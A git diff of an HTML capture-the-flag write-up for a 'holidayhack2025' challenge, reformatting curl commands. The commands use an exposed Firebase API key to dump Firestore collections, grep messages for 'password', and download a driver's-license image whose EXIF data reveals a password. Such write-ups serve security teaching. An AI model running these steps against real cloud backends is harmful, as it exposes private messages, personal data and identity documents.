@@ -112,32 +112,23 @@ const OP={apiKey:"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",authDomain:"holidayha
 Following the comment in the page code, let's see what collections are accessible:
 <br>
 </p>
-<p>
-curl -X GET \
-<br>
-  https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
-<br>
-</p>
+<pre><code class="language-sh">
+curl -X GET https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
+</code></pre>  
 <p>
 Collection contains messages, gnome names, and sender UIDS
 <br>
 </p>
-<p>
-curl -X GET \
-<br>
-https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
-<br>
-</p>
+<pre><code class="language-sh">
+curl -X GET https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
+</code></pre>  
 <p>
 Collection contains avatars, authids,
 <br>
 </p>
-<p>
-curl -X GET \
-<br>
-https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
-<br>
-</p>
+<pre><code class="language-sh">
+curl -X GET https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
+</code></pre>  
 <p>
 Collection contains email addresses, notes and jpeg pictures
 <br>
@@ -146,12 +137,9 @@ Collection contains email addresses, notes and jpeg pictures
 Looking in the dms collection contains a lot of messages. Searching for the string "password" reveals that Barnaby's image file contains location data that will identify his password.
 <br>
 </p>
-<p>
-curl -X GET \
-<br>
-https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk | grep "password"
-<br>
-</p>
+<pre><code class="language-sh">
+curl -X GET https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk | grep "password"
+</code></pre>  
 <p>
 <img src="/HHC_2025/images/gnometea_passwordhint.jpg" alt="Password Hint">
 <br>
@@ -178,10 +166,9 @@ https://firebasestorage.googleapis.com/v0/b/your-bucket/o/path%2Fto%2Ffile.pdf?a
 The correct URL to obtain Barnaby's image is: https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg
 <br>
 </p>
-<p>
+<pre><code class="language-sh">
 curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media" -o drivers_license.jpeg
-<br>
-</p>
+</code></pre>  
 <p>
 <img src="/HHC_2025/images/gnometea_exifdata.jpg" alt="Image Exifdata">
 <br>
